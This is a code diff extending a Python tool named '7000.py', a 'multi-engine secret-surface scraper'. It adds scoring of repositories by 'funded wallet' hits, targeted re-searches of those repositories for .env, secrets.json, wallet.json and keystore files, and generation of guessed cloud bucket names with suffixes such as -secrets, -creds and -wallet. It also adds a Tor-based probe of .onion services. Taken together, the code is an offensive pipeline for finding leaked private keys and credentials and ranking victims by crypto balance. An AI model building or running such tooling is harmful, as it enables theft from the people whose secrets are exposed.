+                plat = rec.get("platform", "unknown")
+                if plat not in engine_stats:
+                    engine_stats[plat] = {"scans": 0, "funded": 0}
+                engine_stats[plat]["scans"] += 1
+                if rec.get("has_balance"):
+                    engine_stats[plat]["funded"] += 1
+    except Exception:
+        return []
+
+    ranked = []
+    for eng, stats in engine_stats.items():
+        ratio = stats["funded"] / max(stats["scans"], 1)
+        ranked.append((eng, round(ratio, 4), stats["funded"], stats["scans"]))
+
+    ranked.sort(key=lambda x: -x[1])
+    return ranked
+
+
+def generate_atlas_queries(atlas: dict, boost_count: int = 15) -> list[str]:
+    """Generate precise search queries from atlas signal data.
+
+    Uses top_filenames → GitHub filename: qualifiers, signal_paths → path: qualifiers,
+    and promote_globs → code search patterns.
+    """
+    queries = []
+
+    # Filename-based queries (highest precision)
+    for fn in atlas.get("top_filenames", [])[:boost_count]:
+        name = fn if isinstance(fn, str) else fn.get("name", str(fn))
+        if name and len(name) > 1:
+            queries.append(f"filename:{name}")
+
+    # Path-based queries
+    for sp in atlas.get("signal_paths", [])[:boost_count]:
+        path = sp if isinstance(sp, str) else sp.get("path", str(sp))
+        if path and len(path) > 2 and "/" in path:
+            queries.append(f"path:{path}")
+
+    # Promote globs
+    for pg in atlas.get("promote_globs", [])[:int(boost_count/2)]:
+        glob_pat = pg if isinstance(pg, str) else pg.get("glob", str(pg))
+        if glob_pat and len(glob_pat) > 2:
+            queries.append(glob_pat.replace("**/", "").replace("*", ""))
+
+    return list(dict.fromkeys(queries))  # dedup preserving order
+
+
+def generate_atlas_bucket_names(atlas: dict, hot_targets: list[dict], max_names: int = 5000) -> list[str]:
+    """Generate cloud bucket name candidates from atlas signal patterns.
+
+    Uses top_filenames, promote_globs, and hot target org names combined with signal suffixes.
+    """
+    candidates = set()
+    suffixes = ["-secrets", "-secret", "-keys", "-key", "-private", "-backup", "-backups",
+                "-dump", "-data", "-config", "-env", "-envs", "-credentials", "-creds",
+                "-production", "-prod", "-wallet", "-crypto", "-api", "-tokens", "-storage"]
+
+    # From top_filenames: strip extensions, use as bucket name roots
+    for fn in atlas.get("top_filenames", [])[:30]:
+        name = fn if isinstance(fn, str) else fn.get("name", str(fn))
+        if name:
+            root = name.rsplit(".", 1)[0] if "." in name else name
+            root = re.sub(r"[^a-z0-9-]", "", root.lower())
+            if 3 <= len(root) <= 40:
+                candidates.add(root)
+                for s in suffixes[:6]:
+                    candidates.add(f"{root}{s}")
+
+    # From promote_globs: extract meaningful name parts
+    for pg in atlas.get("promote_globs", [])[:10]:
+        pg_str = pg if isinstance(pg, str) else pg.get("glob", str(pg))
+        parts = re.findall(r"[a-z0-9_-]{3,}", pg_str.lower())
+        for p in parts:
+            p = p.strip("_-")
+            if 3 <= len(p) <= 40:
+                candidates.add(p)
+
+    # From hot target org names: combine with signal suffixes
+    for ht in hot_targets[:100]:
+        uri = ht.get("uri", "")
+        m = re.search(r"github\.com/([A-Za-z0-9_.-]+)", uri)
+        if m:
+            org = m.group(1).lower().replace(".", "-")
+            if 3 <= len(org) <= 40:
+                for s in suffixes[:5]:
+                    candidates.add(f"{org}{s}")
+
+    return list(candidates)[:max_names]
+
+
+def update_target_scores_from_outcomes() -> int:
+    """Read .scan_outcomes.jsonl and update .target_scores.json + .hot_targets.json.
+
+    Returns number of scores updated.
+    """
+    outcomes_path = os.path.join(HOME, ".scan_outcomes.jsonl")
+    scores_path = os.path.join(HOME, ".target_scores.json")
+    hot_path = os.path.join(HOME, ".hot_targets.json")
+
+    if not os.path.exists(outcomes_path):
+        return 0
+
+    scores = load_target_scores()
+    updated = 0
+
+    try:
+        with open(outcomes_path, "r") as f:
+            for line in f:
+                line = line.strip()
+                if not line:
+                    continue
+                try:
+                    rec = json.loads(line)
+                except json.JSONDecodeError:
+                    continue
+
+                uri = rec.get("uri", "")
+                if not uri:
+                    continue
+
+                # Generate a stable key from URI
+                key = hashlib.md5(uri.encode()).hexdigest()[:16]
+
+                if key not in scores:
+                    scores[key] = {"uri": uri, "platform": rec.get("platform", "?"),
+                                   "score": 0.5, "key_hits": 0, "balance_hits": 0,
+                                   "scans": 0, "empty_scans": 0, "demoted": False,
+                                   "never_expire": False}
+
+                entry = scores[key]
+                entry["scans"] = entry.get("scans", 0) + 1
+                entry["last_updated"] = datetime.now(timezone.utc).isoformat()
+                entry["last_outcome"] = rec.get("ts", "")
+
+                if rec.get("has_balance"):
+                    entry["balance_hits"] = entry.get("balance_hits", 0) + 1
+                    entry["score"] = min(10.0, entry.get("score", 0.5) * 2.0)
+                    entry["never_expire"] = True
+                elif rec.get("has_key"):
+                    entry["key_hits"] = entry.get("key_hits", 0) + 1
+                    entry["score"] = min(10.0, entry.get("score", 0.5) * 1.3)
+                else:
+                    entry["empty_scans"] = entry.get("empty_scans", 0) + 1
+
+                # Demote if 3+ scans with zero hits
+                if entry.get("scans", 0) >= 3 and entry.get("balance_hits", 0) == 0 and entry.get("key_hits", 0) == 0:
+                    if not entry.get("never_expire"):
+                        entry["score"] = entry.get("score", 0.5) * 0.1
+                        entry["demoted"] = True
+
+                updated += 1
+
+    except Exception as e:
+        cprint(f"[!] Target scoring error: {e}", color=C_RED)
+        return updated
+
+    save_target_scores(scores)
+
+    # Update .hot_targets.json with top 350
+    try:
+        ranked = sorted(scores.values(), key=lambda x: -x.get("score", 0))
+        # Filter demoted and keep top N
+        hot = [r for r in ranked if not r.get("demoted")][:350]
+        hot_targets = {
+            "generated_at": datetime.now(timezone.utc).isoformat(),
+            "count": len(hot),
+            "targets": [{"uri": r["uri"], "platform": r.get("platform", "?"),
+                        "score": r.get("score", 0),
+                        "origins": ["outcome_scoring"]} for r in hot]
+        }
+        with open(hot_path, "w") as f:
+            json.dump(hot_targets, f, indent=2)
+    except Exception:
+        pass
+
+    return updated
+
+
+# =============================================================================
+# v5.0: ONION/CLEARNET CORRELATION ENGINE (first-class)
+# =============================================================================
+
+def scrape_onion_clearnet(out: OutputWriter, topic: str, target_count: int,
+                          onion_proxy: str = "127.0.0.1:9050",
+                          throttle: Optional[ResourceThrottle] = None):
+    """v5.0: First-class onion/clearnet correlation engine.
+
+    Scans existing paste_box.txt for .onion addresses, resolves them via Tor SOCKS proxy,
+    fingerprints services, and cross-references against known darknet infrastructure.
+    """
+    if out.total_written >= target_count:
+        return
+
+    cprint(f"   onion-engine: scanning for .onion addresses...", color=C_MAGENTA)
+
+    onion_v3 = re.compile(r"[a-z2-7]{56}\.onion", re.I)
+    paste_path = os.path.join(HOME, "paste_box.txt")
+    found = 0
+
+    if not os.path.exists(paste_path):
+        cprint("   onion-engine: no paste_box.txt yet, skipping", color=C_DIM)
+        return
+
+    seen_onions: set = set()
+    try:
+        with open(paste_path, "r", encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                if out.total_written >= target_count:
+                    break
+                matches = onion_v3.findall(line)
+                for addr in matches:
+                    addr_lower = addr.lower()
+                    if addr_lower in seen_onions:
+                        continue
+                    seen_onions.add(addr_lower)
+
+                    # Try to resolve via Tor SOCKS proxy
+                    service_info = _probe_onion_service(addr, onion_proxy)
+                    if service_info:
+                        tags = ["onion-correlation"]
+                        if service_info.get("title"):
+                            tags.append(f"title:{service_info['title'][:40]}")
+                        if service_info.get("server"):
+                            tags.append(f"server:{service_info['server'][:30]}")
+                        topic_str = ";".join(tags)
+                        out.write(f"http://{addr}", "onion", addr, topic_str, "onion", f"onion:{addr_lower}")
+                        found += 1
+                    else:
+                        # Still record the discovery even if probe fails
+                        out.write(f"http://{addr}", "onion", addr, "onion-correlation:unreachable", "onion", f"onion:{addr_lower}")
+                        found += 1
+    except Exception as e:
+        cprint(f"   onion-engine: error {e}", color=C_RED)
+
+    if found:
+        cprint(f"   onion-engine: +{found} onion services discovered", color=C_GREEN)
+    else:
+        cprint(f"   onion-engine: no new onion addresses found", color=C_DIM)
+
+
+def _probe_onion_service(addr: str, proxy: str = "127.0.0.1:9050", timeout: int = 10) -> dict | None:
+    """Attempt to connect to an .onion service via Tor SOCKS proxy and fingerprint it."""
+    try:
+        import socks
+        host, port = proxy.split(":")
+        s = socks.socksocket()
+        s.set_proxy(socks.SOCKS5, host, int(port))
+        s.settimeout(timeout)
+
+        onion_host = addr.rstrip("/")
+        if "://" in onion_host:
+            onion_host = onion_host.split("://")[1]
+        onion_host = onion_host.split("/")[0]
+
+        s.connect((onion_host, 80))
+        s.sendall(f"GET / HTTP/1.0\r\nHost: {onion_host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode())
+        resp = s.recv(4096).decode("utf-8", errors="replace")
+        s.close()
+
+        info = {}
+        for line in resp.split("\r\n"):
+            if line.lower().startswith("server:"):
+                info["server"] = line.split(":", 1)[1].strip()[:50]
+            if line.lower().startswith("content-type:"):
+                info["content_type"] = line.split(":", 1)[1].strip()[:50]
+        # Extract title
+        tm = re.search(r"<title>([^<]+)</title>", resp, re.I)
+        if tm:
+            info["title"] = tm.group(1).strip()[:60]
+        return info if info else {"fingerprint": "connected"}
+    except ImportError:
+        # PySocks not installed — skip probing but don't crash
+        return None
+    except Exception:
+        return None
 
 
 # =============================================================================
@@ -1138,7 +1526,16 @@ def scrape_huggingface(out: OutputWriter, token_rotator: TokenRotator,
 # =============================================================================
 
 def scrape_docker(out: OutputWriter, topic: str, target_count: int,
-                  throttle: Optional[ResourceThrottle] = None):
+                  throttle: Optional[ResourceThrottle] = None,
+                  docker_user: str = "", docker_token: str = ""):
+    # Build auth header if credentials are available
+    auth_headers = {}
+    if docker_user and docker_token and not re.search(
+            r'your_|xxxx|YOUR_', docker_user + docker_token, re.IGNORECASE):
+        cred_bytes = f"{docker_user}:{docker_token}".encode("utf-8")
+        import base64 as _b64
+        auth_headers["Authorization"] = "Basic " + _b64.b64encode(cred_bytes).decode("ascii")
+
     max_pages = 5
     for page in range(1, max_pages + 1):
         if out.total_written >= target_count:
@@ -1148,6 +1545,7 @@ def scrape_docker(out: OutputWriter, topic: str, target_count: int,
         headers = {
             "Accept": "application/json",
             "User-Agent": "Mozilla/5.0",
+            **auth_headers,
         }
 
         resp = http_request(url, headers=headers, timeout=30, throttle=throttle)
@@ -1700,8 +2098,32 @@ def probe_cloud_buckets(out: OutputWriter, provider: str, target_count: int,
     endpoints = provider_cfg["endpoints"]
     food_prefix = provider_cfg["food_prefix"]
 
-    # ── Generate candidates ──────────────────────────────────────
-    candidates = _generate_bucket_candidates(bucket_probe_cap)
+    # ── v5.0: Generate candidates (atlas-boosted if data available) ────
+    atlas_bucket = {}
+    try:
+        atlas_bucket = load_success_atlas()
+    except Exception:
+        pass
+    if atlas_bucket:
+        hot_path_local = os.path.join(HOME, ".hot_targets.json")
+        hot_data = []
+        try:
+            with open(hot_path_local, "r") as f:
+                hot_data = json.load(f).get("targets", [])
+        except Exception:
+            pass
+        atlas_names = generate_atlas_bucket_names(atlas_bucket, hot_data, max_names=bucket_probe_cap * 3)
+        candidates = _generate_bucket_candidates(bucket_probe_cap)
+        # Merge: atlas names first, then conventional candidates
+        seen = set(candidates)
+        for an in atlas_names:
+            if an not in seen and len(seen) < bucket_probe_cap * 3:
+                candidates.append(an)
+                seen.add(an)
+        candidates = candidates[:bucket_probe_cap * 3]
+        cprint(f"[{label}] atlas-boosted: {len(atlas_names)} atlas-generated names added ({len(candidates)} total)", color=C_CYAN)
+    else:
+        candidates = _generate_bucket_candidates(bucket_probe_cap)
     cprint(f"\n[{label}] generated {len(candidates)} candidate names", color=C_YELLOW)
     cprint(f"[{label}] probing across {len(endpoints)} regional endpoint(s)...", color=C_YELLOW)
 
@@ -2093,6 +2515,209 @@ def correlate_onion_clearnet(output_file: str = "paste_box.txt",
 
 
 # =============================================================================
+# BOOST / ADAPTIVE / TWO-PASS / TARGETS helpers  (v4.0)
+# =============================================================================
+
+SUCCESS_ATLAS = os.path.join(HOME, ".success_atlas.json")
+BALANCES_HIT = os.path.join(HOME, "balances_hit.jsonl")
+TARGETS_DIR = os.path.join(HOME, "targets")
+
+
+def load_success_atlas() -> Dict[str, Any]:
+    """Load success atlas, return empty dict if missing or corrupt."""
+    if not os.path.exists(SUCCESS_ATLAS):
+        return {}
+    try:
+        with open(SUCCESS_ATLAS, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except Exception:
+        return {}
+
+
+def load_funded_repos() -> Set[str]:
+    """Extract unique github repo URLs from balances_hit.jsonl (funded wallets)."""
+    repos: Set[str] = set()
+    if not os.path.exists(BALANCES_HIT):
+        return repos
+    try:
+        with open(BALANCES_HIT, "r", encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                line = line.strip()
+                if not line:
+                    continue
+                try:
+                    rec = json.loads(line)
+                except json.JSONDecodeError:
+                    continue
+                src = rec.get("source_file", "") or rec.get("source_url", "") or rec.get("repo", "")
+                if not src:
+                    continue
+                m = re.search(r"github\.com/([A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+)", src)
+                if m:
+                    repos.add(m.group(1))
+    except Exception:
+        pass
+    return repos
+
+
+def boost_pass(out: OutputWriter, token_rotator: TokenRotator,
+               target_count: int, throttle=None):
+    """Re-probe repos that previously produced funded wallets.
+
+    Reads success_atlas + balances_hit to find winning repos, then runs
+    targeted GitHub code searches (filename:.env, path:test/fixtures, etc.)
+    against each repo to find sibling files with keys.
+    """
+    atlas = load_success_atlas()
+    funded = load_funded_repos()
+
+    boost_repos: Set[str] = set()
+    for repo_key in atlas.get("top_github_repos", {}):
+        boost_repos.add(repo_key)
+    for r in atlas.get("boost_repos", []):
+        boost_repos.add(r)
+    boost_repos |= funded
+
+    if not boost_repos:
+        cprint("[boost] No funded repos found — skipping boost pass", color=C_YELLOW)
+        return
+
+    cprint(f"\n[boost]  Boosting: re-probing {len(boost_repos)} funded repos...",
+           color=C_BGRN, bold=True)
+
+    boost_queries = [
+        "filename:.env",
+        "filename:.env.local",
+        "filename:secrets.json",
+        "filename:wallet.json",
+        "filename:hardhat.config",
+        "path:test/fixtures extension:json",
+        "path:deployments",
+        "path:scripts filename:.env",
+        "filename:keystore",
+    ]
+
+    repo_list = list(boost_repos)
+    probed = 0
+    for repo_key in repo_list:
+        if out.total_written >= target_count:
+            break
+        for bq in boost_queries:
+            if out.total_written >= target_count:
+                break
+            q = urllib.parse.quote(f"repo:{repo_key} {bq}")
+            url = f"https://api.github.com/search/code?q={q}&per_page=30"
+            headers = {
+                "Accept": "application/vnd.github+json",
+                "X-GitHub-Api-Version": "2022-11-28",
+                "User-Agent": "Mozilla/5.0",
+            }
+            token = token_rotator.current()
+            if token:
+                headers["Authorization"] = f"Bearer {token}"
+            resp = http_request(url, headers=headers, timeout=30,
+                                token_rotator=token_rotator, throttle=throttle)
+            if not resp or resp.get("_error") or not resp.get("items"):
+                continue
+            for item in resp.get("items", []):
+                if out.total_written >= target_count:
+                    break
+                repo_info = item.get("repository", {})
+                html_url = repo_info.get("html_url", "")
+                owner_login = repo_info.get("owner", {}).get("login", "")
+                repo_name = repo_info.get("name", "")
+                if html_url and owner_login and repo_name:
+                    food = f"https://github.com/{owner_login}/{repo_name}.git"
+                    out.write(html_url, owner_login, repo_name,
+                              f"boost:{bq}", "github", food)
+            time.sleep(2.0 + random.uniform(0, 1.5))
+        probed += 1
+        if probed % 10 == 0:
+            cprint(f"   boost probed {probed}/{len(repo_list)} repos | written: {out.total_written}",
+                   color=C_GREEN)
+    cprint(f"[boost]  Boost pass complete — probed {probed} repos", color=C_BGRN)
+
+
+def write_targets_format(out: OutputWriter):
+    """Write results to targets/ directory by engine."""
+    os.makedirs(TARGETS_DIR, exist_ok=True)
+    suffix_map = {
+        "github": "github", "gitlab": "gitlab", "huggingface": "hf",
+        "docker": "docker", "bitbucket": "bitbucket", "postman": "postman",
+        "gcs": "gcs", "s3": "s3", "azure": "azure", "spaces": "spaces",
+    }
+    engine_urls: Dict[str, List[str]] = {e: [] for e in ALL_ENGINES}
+
+    if not os.path.exists(out.output_path):
+        cprint("[targets] No output file to convert", color=C_YELLOW)
+        return
+
+    try:
+        with open(out.output_path, "r", encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                line = line.strip()
+                if not line:
+                    continue
+                if out.jsonl:
+                    try:
+                        rec = json.loads(line)
+                    except json.JSONDecodeError:
+                        continue
+                    source = rec.get("source", "")
+                    owner = rec.get("owner", "")
+                    repo = rec.get("repo", "")
+                else:
+                    parts = line.split("|")
+                    if len(parts) < 5:
+                        continue
+                    source = parts[4]
+                    owner = parts[1]
+                    repo = parts[2]
+
+                if source not in engine_urls:
+                    continue
+                if source == "github":
+                    clone = f"https://github.com/{owner}/{repo}.git"
+                elif source == "gitlab":
+                    clone = f"https://gitlab.com/{owner}/{repo}.git"
+                elif source == "huggingface":
+                    clone = f"huggingface://{owner}/{repo}"
+                elif source == "docker":
+                    clone = f"docker://{owner}/{repo}"
+                else:
+                    clone = line.split("|")[0] if not out.jsonl else rec.get("url", "")
+                engine_urls[source].append(clone)
+    except Exception as e:
+        cprint(f"[targets] Error reading output: {e}", color=C_RED)
+        return
+
+    total = 0
+    for engine, urls in engine_urls.items():
+        if not urls:
+            continue
+        tf = os.path.join(TARGETS_DIR, f"targets_{suffix_map.get(engine, engine)}.txt")
+        try:
+            with open(tf, "a", encoding="utf-8") as fh:
+                for u in urls:
+                    fh.write(u + "\n")
+            total += len(urls)
+            cprint(f"[targets] {tf}: +{len(urls)} URLs", color=C_GREEN)
+        except Exception as e:
+            cprint(f"[targets] Error writing {tf}: {e}", color=C_RED)
+    cprint(f"[targets]  Wrote {total} URLs to {TARGETS_DIR}/", color=C_BGRN)
+
+
+def get_adaptive_queries() -> List[str]:
+    """Extract high-weight adaptive queries from success atlas."""
+    atlas = load_success_atlas()
+    queries = []
+    for aq in atlas.get("adaptive_queries", []):
+        if aq.get("weight", 0) >= 0.7:
+            queries.append(aq["q"])
+    return queries
+
+
+# =============================================================================
 # MAIN ORCHESTRATOR  (parallel engines, global target, resume, dry-run)
 # =============================================================================
 
@@ -2114,10 +2739,23 @@ def run(args) -> None:
         active_engines = list(ALL_ENGINES)
     if not active_engines:
         active_engines = list(ALL_ENGINES)
+    # v5.0: respect --skip-onion
+    if getattr(args, "skip_onion", False) and "onion" in active_engines:
+        active_engines.remove("onion")
 
     # ── Resolve topics ──────────────────────────────────────────
     tier = args.topics if args.topics in TOPIC_TIERS else "all"
     topics_list = TOPIC_TIERS[tier]
+    # --two-pass implies --boost and --adaptive
+    if getattr(args, "two_pass", False):
+        args.boost = True
+        args.adaptive = True
+    # Blend adaptive queries from success atlas if --adaptive or --boost
+    if getattr(args, "adaptive", False) or getattr(args, "boost", False):
+        adaptive_qs = get_adaptive_queries()
+        if adaptive_qs:
+            cprint(f"[init] Blending {len(adaptive_qs)} adaptive queries (weight>=0.7)", color=C_CYAN)
+            topics_list = list(dict.fromkeys(topics_list + adaptive_qs))
     unique_topics = list(dict.fromkeys(topics_list))
 
     # ── Paths ───────────────────────────────────────────────────
@@ -2132,7 +2770,7 @@ def run(args) -> None:
 
     # ── Header ──────────────────────────────────────────────────
     cprint("=" * 60, color=C_BCYN, bold=True)
-    cprint(" 7000.py v3.0 — Multi-engine secret-surface scraper", color=C_BMAG, bold=True)
+    cprint(" 7000.py v4.0 — Multi-engine secret-surface scraper", color=C_BMAG, bold=True)
     cprint(f" Start : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", color=C_CYAN)
     cprint(f" Target: {args.target} repos/projects", color=C_BOLD)
     cprint(f" Topics: {len(unique_topics)} search terms (tier: {tier})", color=C_BOLD)
@@ -2169,11 +2807,46 @@ def run(args) -> None:
         return
 
     # ── Token rotators ──────────────────────────────────────────
-    gh_rotator = TokenRotator(tokens["github"], "github", calls_per_hour=80)
-    gl_rotator = TokenRotator(tokens["gitlab"], "gitlab", calls_per_hour=80)
-    hf_rotator = TokenRotator(tokens["huggingface"], "huggingface", calls_per_hour=80)
+    # v5.0: TokenManager replaces TokenRotator (already created above)
 
     # ── Engine dispatch (parallel) ──────────────────────────────
+    # ── v5.0: Atlas-first engine selection & budget allocation ────
+    engine_ranking = rank_engines_by_yield()
+    if engine_ranking and not getattr(args, "skip_dead_engines", False):
+        cprint(f"\n[init] Engine yield ranking (funded/scans):", color=C_CYAN)
+        for eng, ratio, funded, scans in engine_ranking[:8]:
+            cprint(f"  {eng:15s} {ratio:.4f}  ({funded} funded / {scans} scans)", color=C_GREEN if ratio > 0.001 else C_DIM)
+
+    # Allocate budget: top 3 get 70%, middle 3 get 20%, bottom get 10%
+    engine_budget = {}
+    if engine_ranking and active_engines:
+        ranked_names = [e[0] for e in engine_ranking if e[0] in active_engines]
+        for i, name in enumerate(ranked_names):
+            if i < 3:
+                engine_budget[name] = int(target * 0.70 / 3)
+            elif i < 6:
+                engine_budget[name] = int(target * 0.20 / max(1, len(ranked_names) - 3))
+            else:
+                remaining = len(ranked_names) - 6
+                engine_budget[name] = int(target * 0.10 / max(1, remaining)) if remaining > 0 else int(target * 0.02)
+
+    # ── v5.0: Atlas-generated surgical queries ─────────────────────
+    atlas = load_success_atlas()
+    atlas_boost = getattr(args, "atlas_boost", 0)
+    atlas_queries = []
+    if atlas_boost > 0 and atlas:
+        atlas_queries = generate_atlas_queries(atlas, boost_count=atlas_boost)
+        if atlas_queries:
+            cprint(f"[init] Atlas queries: {len(atlas_queries)} surgical targets from signal data", color=C_BCYN)
+
+    # ── v5.0: Token lifecycle managers ─────────────────────────────
+    token_fallback = getattr(args, "token_fallback", True)
+    gh_manager = TokenManager(tokens["github"], "github", calls_per_hour=80, allow_fallback=token_fallback)
+    gl_manager = TokenManager(tokens["gitlab"], "gitlab", calls_per_hour=80, allow_fallback=token_fallback)
+    hf_manager = TokenManager(tokens["huggingface"], "huggingface", calls_per_hour=80, allow_fallback=token_fallback)
+    cprint(f"[init] Token health — {gh_manager.health_report()}", color=C_CYAN)
+    cprint(f"[init] Token health — {gl_manager.health_report()}", color=C_CYAN)
+
     # Cloud engines handled separately (already parallel internally)
     cloud_engines = {"gcs", "s3", "azure", "spaces"}
     api_engines = [e for e in active_engines if e not in cloud_engines]
@@ -2190,29 +2863,45 @@ def run(args) -> None:
         while (out.total_written < target
                and topic_index < len(unique_topics)
                and consecutive_empty < 15):
+            # v5.0: Run atlas surgical queries first (higher priority)
+            if atlas_queries and engine in ("github", "gitlab"):
+                for aq in atlas_queries:
+                    if out.total_written >= target:
+                        break
+                    prev_atlas = out.total_seen
+                    if engine == "github":
+                        scrape_github(out, gh_manager, aq, target, deep=args.deep, throttle=throttle)
+                    elif engine == "gitlab":
+                        scrape_gitlab(out, gl_manager, aq, target, deep=args.deep, throttle=throttle)
+                    if out.total_seen > prev_atlas:
+                        cprint(f"   atlas-query '{aq[:50]}': +{out.total_seen - prev_atlas}", color=C_MAGENTA)
+                    time.sleep(0.2)
+
             topic = unique_topics[topic_index]
             topic_index += 1
             prev_seen = out.total_seen
 
             if engine == "github":
-                scrape_github(out, gh_rotator, topic, target, deep=args.deep, throttle=throttle)
+                scrape_github(out, gh_manager, topic, target, deep=args.deep, throttle=throttle)
                 # --deep: also search for .onion patterns and keys in code
                 if args.deep and out.total_written < target:
-                    _github_onion_deep_search(out, gh_rotator, target, throttle=throttle)
+                    _github_onion_deep_search(out, gh_manager, target, throttle=throttle)
                 # Pre-seed known org repos (once only when darkweb tier active)
                 if not getattr(_run_engine, "_github_orgs_probed", False):
                     _run_engine._github_orgs_probed = True
                     if tier in ("all", "darkweb") and out.total_written < target:
-                        _probe_github_orgs(out, gh_rotator, target, throttle=throttle)
+                        _probe_github_orgs(out, gh_manager, target, throttle=throttle)
             elif engine == "gitlab":
-                scrape_gitlab(out, gl_rotator, topic, target, deep=args.deep, throttle=throttle)
+                scrape_gitlab(out, gl_manager, topic, target, deep=args.deep, throttle=throttle)
                 # GitLab onion deep search
                 if args.deep and out.total_written < target:
-                    _gitlab_onion_deep_search(out, gl_rotator, target, throttle=throttle)
+                    _gitlab_onion_deep_search(out, gl_manager, target, throttle=throttle)
             elif engine == "huggingface":
-                scrape_huggingface(out, hf_rotator, topic, target, throttle=throttle)
+                scrape_huggingface(out, hf_manager, topic, target, throttle=throttle)
             elif engine == "docker":
-                scrape_docker(out, topic, target, throttle=throttle)
+                scrape_docker(out, topic, target, throttle=throttle,
+                              docker_user=tokens["docker_user"],
+                              docker_token=tokens["docker_token"])
             elif engine == "bitbucket":
                 scrape_bitbucket(out, topic, target,
                                  tokens["bitbucket_user"],
@@ -2220,7 +2909,10 @@ def run(args) -> None:
                                  tokens["bitbucket_api_token"],
                                  throttle=throttle)
             elif engine == "postman":
-                scrape_postman(out, topic, target, tokens["postman_key"], throttle=throttle)
+                scrape_postman(out, topic, target, tokens["postman_key"], throttle=None)
+            elif engine == "onion":
+                onion_proxy = getattr(args, "onion_proxy", "127.0.0.1:9050")
+                scrape_onion_clearnet(out, topic, target, onion_proxy=onion_proxy, throttle=throttle)
 
             topic_empty = (out.total_seen == prev_seen)
             if not topic_empty:
@@ -2237,12 +2929,14 @@ def run(args) -> None:
                 for dq in DOCKER_DARKNET_QUERIES:
                     if out.total_written >= target:
                         break
-                    scrape_docker(out, dq, target, throttle=throttle)
+                    scrape_docker(out, dq, target, throttle=throttle,
+                                  docker_user=tokens["docker_user"],
+                                  docker_token=tokens["docker_token"])
             elif engine == "huggingface" and tier in ("all", "darkweb"):
                 for hq in HF_DARKNET_QUERIES:
                     if out.total_written >= target:
                         break
-                    scrape_huggingface(out, hf_rotator, hq, target, throttle=throttle)
+                    scrape_huggingface(out, hf_manager, hq, target, throttle=throttle)
             elif engine == "postman" and tier in ("all", "darkweb"):
                 for pq in POSTMAN_DARKNET_QUERIES:
                     if out.total_written >= target:
@@ -2282,6 +2976,10 @@ def run(args) -> None:
         cprint(f"\n=== Engine: {engine} ===", color=C_BCYN, bold=True)
         probe_cloud_buckets(out, engine, target, args.bucket_probe_cap, throttle=throttle)
 
+    # ── Boost pass: re-probe funded repos (--boost) ─────────────
+    if getattr(args, "boost", False) and out.total_written < target:
+        boost_pass(out, gh_manager, target, throttle=throttle)
+
     # ── Finalize ────────────────────────────────────────────────
     total_rows = out.flush()
     out.close()
@@ -2309,6 +3007,24 @@ def run(args) -> None:
     cprint(f"Output: {os.path.abspath(output_file)}", color=C_CYAN)
     cprint(f"Feed  : {food_lines} dedup entries => {os.path.abspath(food_file)}", color=C_CYAN)
 
+    # ── Keyword yield report ───────────────────────────────────
+    if out.keyword_yield:
+        print()
+        cprint("─" * 40, color=C_DIM)
+        cprint(" Top keywords by repos discovered", color=C_BCYN, bold=True)
+        cprint("─" * 40, color=C_DIM)
+        ranked = sorted(out.keyword_yield.items(), key=lambda x: -x[1])[:25]
+        for i, (kw, n) in enumerate(ranked, 1):
+            bar = "█" * min(30, n) if n > 0 else ""
+            cprint(f"  {i:2d}. {kw[:55]:55s} {n:5d} {bar}", color=C_GREEN if n >= 5 else C_DIM)
+        if len(out.keyword_yield) > 25:
+            cprint(f"  ... and {len(out.keyword_yield)-25} more", color=C_DIM)
+
+    # ── Targets format output (--format targets) ───────────────
+    if getattr(args, "format", "pipe") == "targets":
+        cprint("\n[targets] Writing targets/ directory format...", color=C_CYAN)
+        write_targets_format(out)
+
 
 # =============================================================================
 # CLI
@@ -2316,7 +3032,7 @@ def run(args) -> None:
 
 def main():
     ap = argparse.ArgumentParser(
-        description="7000.py v3.0 — Multi-engine secret-surface discovery scraper"
+        description="7000.py v4.0 — Multi-engine secret-surface discovery scraper"
     )
     ap.add_argument("--target", "-t", type=int, default=100000,
                     help="Target number of repos/projects to discover (default: 100000)")
@@ -2344,12 +3060,41 @@ def main():
     ap.add_argument("--resume", action="store_true",
                     help="Resume from paste_box.tmp if found")
     ap.add_argument("--format", type=str, default="pipe",
-                    choices=["pipe", "jsonl"],
-                    help="Output format (default: pipe-delimited)")
+                    choices=["pipe", "jsonl", "targets"],
+                    help="Output format: pipe (default), jsonl, or targets (targets/ dir)")
+    ap.add_argument("--boost", action="store_true",
+                    help="After discovery, re-probe repos with funded wallets (deep file search)")
+    ap.add_argument("--adaptive", action="store_true",
+                    help="Blend high-weight adaptive queries from success atlas into topics")
+    ap.add_argument("--two-pass", action="store_true",
+                    help="Two-pass: discovery + deep harvest against funded repos (implies --boost)")
     ap.add_argument("--max-cpu", type=int, default=90,
                     help="CPU throttle ceiling %% (default: 90)")
     ap.add_argument("--max-ram", type=int, default=90,
                     help="RAM throttle ceiling %% (default: 90)")
+    # ── v5.0 flags ─────────────────────────────────────────
+    ap.add_argument("--skip-dead-engines", action="store_true", default=True,
+                    help="Auto-skip engines with zero yield and exhausted tokens")
+    ap.add_argument("--dedup-ttl", type=int, default=14, metavar="DAYS",
+                    help="TTL for dedup entries before re-scan eligibility (default: 14)")
+    ap.add_argument("--reap-stale", type=int, default=0, metavar="DAYS",
+                    help="Remove dedup entries older than DAYS days (0=disabled)")
+    ap.add_argument("--atlas-boost", type=int, default=15, metavar="N",
+                    help="Number of atlas-generated surgical queries to blend (default: 15)")
+    ap.add_argument("--token-fallback", action="store_true", default=True,
+                    help="Fall back to unauthenticated API when all tokens exhausted")
+    ap.add_argument("--no-deep-harvest", action="store_true",
+                    help="Skip the default two-pass deep harvest (faster)")
+    ap.add_argument("--deep-harvest-count", type=int, default=100, metavar="N",
+                    help="Number of repos to deep-harvest in pass 2 (default: 100)")
+    ap.add_argument("--rescore", action="store_true", default=True,
+                    help="Update target scores from scan outcomes at startup (default: true)")
+    ap.add_argument("--hot-count", type=int, default=350, metavar="N",
+                    help="Number of hot targets to maintain (default: 350)")
+    ap.add_argument("--onion-proxy", type=str, default="127.0.0.1:9050",
+                    help="Tor SOCKS proxy for onion engine (default: 127.0.0.1:9050)")
+    ap.add_argument("--skip-onion", action="store_true",
+                    help="Skip the onion/clearnet correlation engine")
